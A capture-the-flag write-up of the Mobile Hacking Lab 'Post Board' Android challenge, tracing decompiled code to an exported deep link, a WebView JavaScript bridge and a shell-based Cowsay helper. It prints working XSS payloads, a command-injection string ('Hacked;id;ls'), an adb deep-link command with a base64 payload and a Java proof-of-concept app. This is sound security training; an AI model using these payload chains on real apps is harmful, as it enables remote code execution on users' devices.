---
title: Post Board - Mobile Hacking Lab
date: 2025-3-10 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, android]     # TAG names should always be lowercase

---



<br />

### Introduction

Welcome to the Android Insecure WebView Challenge! This challenge is designed to delve into the complexities of Android's WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It's an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.

<br />

### Objective

Exploit an XSS vulnerability in a WebView component to achieve RCE in an Android application.

<br />





If you attempt to write markdown text, it will be rendered accordingly

```markdown
# H1 text
### H3 text
```



<br />

![](/assets/img/mhl/PostBoard/1.png)

<br />



**XSS**

```html
<img src=x onerror=alert("XSS")>
```



![](/assets/img/mhl/PostBoard/2.png)



<br /><br />

**Analyzing the application using JADX**

From: AndroidManifest.xml

```xml
 <activity
    android:name="com.mobilehackinglab.postboard.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="postboard"
            android:host="postmessage"/>
    </intent-filter>
</activity>
```

Android manifest snippet defines `MainActivity` as an exported activity with two intent filters. The first filter designates it as the **main entry point**, allowing it to be launched from the home screen or app drawer using `android.intent.action.MAIN` and `android.intent.category.LAUNCHER`. The second filter enables **deep linking**, allowing other apps or browsers to open the activity using a custom URL scheme (`postboard://postmessage`). This is achieved with `android.intent.action.VIEW`, along with `android.intent.category.DEFAULT` and `android.intent.category.BROWSABLE`, which make the activity accessible via external links. However, since `android:exported="true"`, any app can start this activity



<br />

From: com.mobilehackinglab.postboard.MainActivity

```java
private final void setupWebView(WebView webView) {
    webView.getSettings().setJavaScriptEnabled(true);
    webView.setWebChromeClient(new WebAppChromeClient());
    webView.addJavascriptInterface(new WebAppInterface(), "WebAppInterface");
    webView.loadUrl("file:///android_asset/index.html");
}

private final void handleIntent() {
    Intent intent = getIntent();
    String action = intent.getAction();
    Uri data = intent.getData();
    if (!Intrinsics.areEqual("android.intent.action.VIEW", action) || data == null || !Intrinsics.areEqual(data.getScheme(), "postboard") || !Intrinsics.areEqual(data.getHost(), "postmessage")) {
        return;
    }
    ActivityMainBinding activityMainBinding = null;
    try {
        String path = data.getPath();
        byte[] decode = Base64.decode(path != null ? StringsKt.drop(path, 1) : null, 8);
        Intrinsics.checkNotNullExpressionValue(decode, "decode(...)");
        String message = StringsKt.replace$default(new String(decode, Charsets.UTF_8), "'", "\\'", false, 4, (Object) null);
        ActivityMainBinding activityMainBinding2 = this.binding;
        if (activityMainBinding2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            activityMainBinding2 = null;
        }
        activityMainBinding2.webView.loadUrl("javascript:WebAppInterface.postMarkdownMessage('" + message + "')");
    } catch (Exception e) {
        ActivityMainBinding activityMainBinding3 = this.binding;
        if (activityMainBinding3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
        } else {
            activityMainBinding = activityMainBinding3;
        }
        activityMainBinding.webView.loadUrl("javascript:WebAppInterface.postCowsayMessage('" + e.getMessage() + "')");
    }
}
```

The `setupWebView` method initializes a `WebView` in an Android application, enabling JavaScript execution and setting up important components for handling web content and interactions. It performs the following tasks:

1. **Enable JavaScript**: `webView.getSettings().setJavaScriptEnabled(true);` allows JavaScript execution, which is necessary for interactive web pages but can pose security risks if not handled properly. Enabling JavaScript can expose the app to **cross-site scripting (XSS) attacks**, especially if untrusted content is loaded.
2. **Set WebChromeClient**: `webView.setWebChromeClient(new WebAppChromeClient());` helps manage JavaScript dialogs, progress updates, and other advanced web interactions.
3. **Add a JavaScript Interface**: `webView.addJavascriptInterface(new WebAppInterface(), "WebAppInterface");` allows JavaScript running in the WebView to call native Android methods via the `WebAppInterface` class. The `addJavascriptInterface` method can allow malicious JavaScript to execute native code if the interface exposes sensitive methods.
4. **Load Local HTML File**: `webView.loadUrl("file:///android_asset/index.html");` loads an HTML file from the app’s assets folder, meaning the web content is bundled with the app and does not require an internet connection.

<br />

The `handleIntent` method processes incoming intents to determine whether they match a specific scheme and host before proceeding with any action. Here's how it works:

1. **Retrieve the Intent**:
   - The method gets the `Intent` object using `getIntent()`, which represents the data passed when the activity was launched.
2. **Extract Action and Data**:
   - It extracts the intent action using `intent.getAction()` and retrieves any associated data (URI) using `intent.getData()`.
3. **Validate the Intent**:
   - The method checks if:
     - The action is `"android.intent.action.VIEW"`, which is typically used for deep linking.
     - The `data` (URI) is **not null**.
     - The scheme of the URI is `"postboard"`.
     - The host of the URI is `"postmessage"`.



<br />

**Extract the Path from the URI**

- The `data.getPath()` method retrieves the path segment of the URI.
- `StringsKt.drop(path, 1)` removes the leading `/` from the path if it's not `null`.

**Decode the Base64-Encoded String**

- The path (after removing the `/`) is Base64-decoded using `Base64.decode(...)` with the flag `8` (`Base64.URL_SAFE` mode).
- `Intrinsics.checkNotNullExpressionValue(decode, "decode(...)")` ensures that the decoding result is not `null`.

**Convert the Decoded Data to a String**

- A new `String(decode, Charsets.UTF_8)` is created from the decoded byte array.
- Any single quotes (`'`) in the decoded message are escaped to prevent JavaScript injection issues using `StringsKt.replace$default(...)`.

**Inject the Decoded Message into JavaScript**

- The processed message is injected into the WebView using:

  ```java
  activityMainBinding2.webView.loadUrl("javascript:WebAppInterface.postMarkdownMessage('" + message + "')");
  ```

- This calls the JavaScript function `postMarkdownMessage(...)` with the decoded message.





<br /><br /><br />

From: com.mobilehackinglab.postboard.WebAppInterface

```java
@JavascriptInterface
public final void postMarkdownMessage(String markdownMessage) {
    Intrinsics.checkNotNullParameter(markdownMessage, "markdownMessage");
    String html = new Regex("```(.*?)```", RegexOption.DOT_MATCHES_ALL).replace(markdownMessage, "<pre><code>$1</code></pre>");
    String html2 = new Regex("`([^`]+)`").replace(html, "<code>$1</code>");
    String html3 = new Regex("!\\[(.*?)\\]\\((.*?)\\)").replace(html2, "<img src='$2' alt='$1'/>");
    String html4 = new Regex("###### (.*)").replace(html3, "<h6>$1</h6>");
    String html5 = new Regex("##### (.*)").replace(html4, "<h5>$1</h5>");
    String html6 = new Regex("#### (.*)").replace(html5, "<h4>$1</h4>");
    String html7 = new Regex("### (.*)").replace(html6, "<h3>$1</h3>");
    String html8 = new Regex("## (.*)").replace(html7, "<h2>$1</h2>");
    String html9 = new Regex("# (.*)").replace(html8, "<h1>$1</h1>");
    });
}

@JavascriptInterface
public final void postCowsayMessage(String cowsayMessage) {
    Intrinsics.checkNotNullParameter(cowsayMessage, "cowsayMessage");
    String asciiArt = CowsayUtil.INSTANCE.runCowsay(cowsayMessage);
    String html = StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(asciiArt, "&", "&amp;", false, 4, (Object) null), "<", "&lt;", false, 4, (Object) null), ">", "&gt;", false, 4, (Object) null), "\"", "&quot;", false, 4, (Object) null), "'", "&#039;", false, 4, (Object) null);
    this.cache.addMessage("<pre>" + StringsKt.replace$default(html, "\n", "<br>", false, 4, (Object) null) + "</pre>");
	}
}
```

This method, `postMarkdownMessage`, is a JavaScript interface function that converts Markdown syntax into HTML for rendering inside a WebView. It's annotated with `@JavascriptInterface`, meaning it can be called from JavaScript running in the WebView.

This `postCowsayMessage` method is aslo a **JavaScript interface** function that generates ASCII art using the **Cowsay** utility and formats it for display in a WebView.



<br /><br />



From: defpackage.CowsayUtil

```java
public final class CowsayUtil {

    public final String runCowsay(String message) {
        Intrinsics.checkNotNullParameter(message, "message");
        try {
            String[] command = {"/bin/sh", "-c", CowsayUtil.scriptPath + ' ' + message};
            Process process = Runtime.getRuntime().exec(command);
            StringBuilder output = new StringBuilder();
            InputStream inputStream = process.getInputStream();
            Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
            Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
            BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
            try {
                BufferedReader reader = bufferedReader;
                while (true) {
                    String it = reader.readLine();
                    if (it == null) {
                        Unit unit = Unit.INSTANCE;
                        CloseableKt.closeFinally(bufferedReader, null);
                        process.waitFor();
                        String sb = output.toString();
                        Intrinsics.checkNotNullExpressionValue(sb, "toString(...)");
                        return sb;
                    }
                    output.append(it).append("\n");
                }
            } finally {
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "cowsay: " + e.getMessage();
        }
    }
}
```

This method **executes a shell command** to run the **Cowsay** script and captures the output.

Runs the **Cowsay script** by building the command:

```bash
/bin/sh -c scriptPath message
```





<br /><br />



From: assets/index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sticky Note Message Board</title>
</head>
<body>
<div class="message-board" id="messageBoard"></div>

<div class="message-input">
    <textarea id="message" placeholder="Write your Markdown message here"></textarea>
    <div class="button-group">
        <button onclick="postMessage()" class="post-message-button">Post Message</button>
        <button onclick="clearMessages()" class="clear-button">X</button>
    </div>
</div>

<script>
        function postMessage() {
            var message = document.getElementById('message');

            // Call JavaScript interface to post message
            window.WebAppInterface.postMarkdownMessage(message.value);

            message.value = '';

            // Update the message board
            updateMessages();
        }

        function updateMessages() {
            var jsonString = window.WebAppInterface.getMessages();
            var messages = JSON.parse(jsonString);

            var messageBoard = document.getElementById('messageBoard');
            messageBoard.innerHTML = ''; // Clear message board

            // Add messages as sticky notes to the message board
            messages.forEach(function(message) {
                var stickyNote = document.createElement('div');
                stickyNote.className = 'sticky-note';
                stickyNote.innerHTML = message;
                messageBoard.appendChild(stickyNote);
            });

            // Scroll to the bottom of the message board
            messageBoard.scrollTop = messageBoard.scrollHeight;
        }

        function clearMessages() {
            var messageBoard = document.getElementById('messageBoard');
            messageBoard.innerHTML = ''; // Clear message board

            // Call JavaScript interface to clear cache
            window.WebAppInterface.clearCache();
        }

        updateMessages();
</script>
</body>
</html>
```



<br />

<br />

From: assets/cowsay.sh

```bash
#!/bin/sh

# Function to print the top border of the speech bubble
print_top() {
    message="$1"
    length=$(echo -n "$message" | wc -c)
    printf " "
    i=0
    while [ "$i" -lt "$length" ]; do
        printf "_"
        i=$((i+1))
    done
    printf "\n"
}

# Function to print the bottom border of the speech bubble
print_bottom() {
    message="$1"
    length=$(echo -n "$message" | wc -c)
    printf " "
    i=0
    while [ "$i" -lt "$length" ]; do
        printf "-"
        i=$((i+1))
    done
    printf "\n"
}

# Function to print the speech bubble with the message
print_message() {
    message="$1"
    print_top "$message"
    printf "< %s >\n" "$message"
    print_bottom "$message"
}

# Function to print the cow
print_cow() {
    printf "        \\   ^__^\\n"
    printf "         \\  (oo)\\_______\\n"
    printf "            (__)\\       )\\/\\n"
    printf "                ||----w |\\n"
    printf "                ||     ||\\n"
}

# Main script execution
main() {
    if [ "$#" -lt 1 ]; then
        printf "Usage: %s <message>\\n" "$0"
        exit 1
    fi

    # Concatenate all arguments into one argument separated by a space
    message="$*"

    print_message "$message"
    print_cow
}

# Call the main function with all arguments passed to the script
main "$@"
```

<br />

<br />

<br />







**RCE From XSS** 

<br />

<br />

methods enumeration

```html
<img src=x onerror=alert(Object.keys(WebAppInterface))>
```

![](/assets/img/mhl/PostBoard/4.png)



<br />

<br />



```html
<img src=x onerror="WebAppInterface.postCowsayMessage('Hacked;id;ls')">
```



<br />

<br />



![](/assets/img/mhl/PostBoard/3.png)

<br />

<br />

<br />

**adb**

```bash
adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE  -d postboard://postmessage/<base64-Payload>
```

<br />

```bash
adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE  -d postboard://postmessage/PGltZyBzcmM9eCBvbmVycm9yPSJXZWJBcHBJbnRlcmZhY2UucG9zdENvd3NheU1lc3NhZ2UoJ3NzcztpZDtscycpIj4=
```

<br />

<br />

<br />

**Android app PoC**

<br />

```java
Intent intent = new Intent();
intent.setAction("android.intent.action.VIEW");
intent.setClassName("com.mobilehackinglab.postboard", "com.mobilehackinglab.postboard.MainActivity");
String message = "<img src=x onerror=\"WebAppInterface.postCowsayMessage('hacked;id;ls')\">";;
String encodedMessage = Base64.getEncoder().encodeToString(message.getBytes());;
intent.setData(Uri.parse("postboard://postmessage/"+encodedMessage));
startActivity(intent);
```

1. run the app
2. click Post Message Button





